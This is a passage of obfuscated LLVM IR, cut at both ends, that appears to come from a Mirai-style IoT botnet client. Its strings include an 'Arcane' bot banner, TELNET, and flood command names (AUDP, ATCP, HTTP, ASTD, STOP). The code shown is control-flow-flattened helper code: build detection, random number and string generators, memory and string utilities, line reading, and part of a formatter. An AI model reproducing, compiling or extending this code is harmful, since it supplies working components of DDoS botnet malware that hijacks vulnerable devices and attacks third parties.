x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.128 = private unnamed_addr constant [5 x i8] c"AUDP\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"ATCP\00", align 1
@.str.130 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"ASTD\00", align 1
@.str.132 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.134 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.135 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.136 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.138 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.139 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.140 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.141 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.142 = private unnamed_addr constant [130 x i8] c"\1B[0;97m[ \1B[0;92mArcane \1B[0;97m] [ \1B[0;92m%s\1B[0;97m ] Connected = \1B[0;92m%s\1B[0;97m  | Endian \1B[0;92m%s  \1B[0;97m| Device: \1B[0;92m%s\00", align 1
@.str.143 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  store i32 %2, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 199925867, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 199925867, label %first
    i32 -1329465089, label %5
    i32 -581140793, label %6
    i32 363365573, label %10
    i32 583252402, label %11
    i32 818248315, label %15
    i32 109931396, label %16
    i32 -1707528158, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp ne i32 %.reload, -1
  %4 = select i1 %3, i32 -1329465089, i32 -581140793
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  store i32 -1707528158, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i32 0, i32 0), i32 0) #3
  %8 = icmp ne i32 %7, -1
  %9 = select i1 %8, i32 363365573, i32 583252402
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i32 0, i32 0), i8** %1, align 8
  store i32 -1707528158, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i32 0, i32 0), i32 0) #3
  %13 = icmp ne i32 %12, -1
  %14 = select i1 %13, i32 818248315, i32 109931396
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i32 0, i32 0), i8** %1, align 8
  store i32 -1707528158, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8** %1, align 8
  store i32 -1707528158, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8*, i8** %1, align 8
  ret i8* %18

loopEnd:                                          ; preds = %16, %15, %11, %10, %6, %5, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 833764312, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 833764312, label %10
    i32 -30432712, label %14
    i32 622404331, label %32
    i32 1909180997, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -30432712, i32 1909180997
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 622404331, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 833764312, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -190707083, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -190707083, label %first
    i32 1735796443, label %30
    i32 1662463950, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 1735796443, i32 1662463950
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 1662463950, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #3
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #3
  %4 = call i32 @getppid() #3
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #3
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -1398546124, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1398546124, label %5
    i32 -749716826, label %9
    i32 -621627884, label %13
    i32 -1598102627, label %23
    i32 936017437, label %27
    i32 182899173, label %39
    i32 -314473047, label %47
    i32 1474484687, label %48
    i32 -1669212402, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 -749716826, i32 -1669212402
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 -621627884, i32 -1598102627
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 1474484687, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 936017437, i32 182899173
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 -314473047, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 -314473047, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1474484687, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -1398546124, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -672629603, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -672629603, label %8
    i32 -333552282, label %12
    i32 -554008533, label %17
    i32 1396587893, label %19
    i32 -841817874, label %24
    i32 1829240711, label %40
    i32 -626522215, label %43
    i32 -1425082898, label %48
    i32 -1051553070, label %57
    i32 844731870, label %58
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = select i1 %10, i32 -333552282, i32 844731870
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp uge i64 %14, 4
  %16 = select i1 %15, i32 -554008533, i32 -1425082898
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = call i32 @rand_next()
  store i32 %18, i32* %6, align 4
  store i32 0, i32* %5, align 4
  store i32 1396587893, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = icmp ult i64 %21, 4
  %23 = select i1 %22, i32 -841817874, i32 -626522215
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %6, align 4
  %26 = and i32 %25, 255
  %27 = trunc i32 %26 to i8
  store i8 %27, i8* %7, align 1
  %28 = load i32, i32* %6, align 4
  %29 = lshr i32 %28, 8
  store i32 %29, i32* %6, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i32
  %32 = ashr i32 %31, 3
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %7, align 1
  %34 = load i8, i8* %7, align 1
  %35 = zext i8 %34 to i64
  %36 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %3, align 8
  store i8 %37, i8* %38, align 1
  store i32 1829240711, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  store i32 1396587893, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = sub i64 %45, 4
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  store i32 -1051553070, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = call i32 @rand_next()
  %50 = zext i32 %49 to i64
  %51 = urem i64 %50, 32
  %52 = trunc i64 %51 to i8
  %53 = load i8*, i8** %3, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %3, align 8
  store i8 %52, i8* %53, align 1
  %55 = load i32, i32* %4, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %4, align 4
  store i32 -1051553070, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -672629603, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %48, %43, %40, %24, %19, %17, %12, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1624749436, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1624749436, label %4
    i32 -272984319, label %11
    i32 -265683121, label %14
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  %10 = select i1 %9, i32 -272984319, i32 -265683121
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* %3, align 4
  store i32 1624749436, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  ret i32 %15

loopEnd:                                          ; preds = %11, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  %switchVar = alloca i32
  store i32 -110534065, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -110534065, label %11
    i32 1235134764, label %16
    i32 -727810607, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  %15 = select i1 %14, i32 1235134764, i32 -727810607
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %8, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %8, align 8
  %19 = load i8, i8* %17, align 1
  %20 = load i8*, i8** %7, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %7, align 8
  store i8 %19, i8* %20, align 1
  store i32 -110534065, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 1716170892, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1716170892, label %9
    i32 -548485131, label %13
    i32 1217086974, label %18
    i32 -1489736644, label %27
    i32 -1429284464, label %29
    i32 -629551700, label %39
    i32 1460713331, label %43
    i32 -872118798, label %44
    i32 574606396, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -548485131, i32 -1489736644
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 1217086974, i32 -1489736644
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -1489736644, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -1429284464, i32 -629551700
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 1716170892, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 1460713331, i32 -872118798
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 574606396, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 574606396, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1756217305, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i64*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1756217305, label %12
    i32 -1395463301, label %18
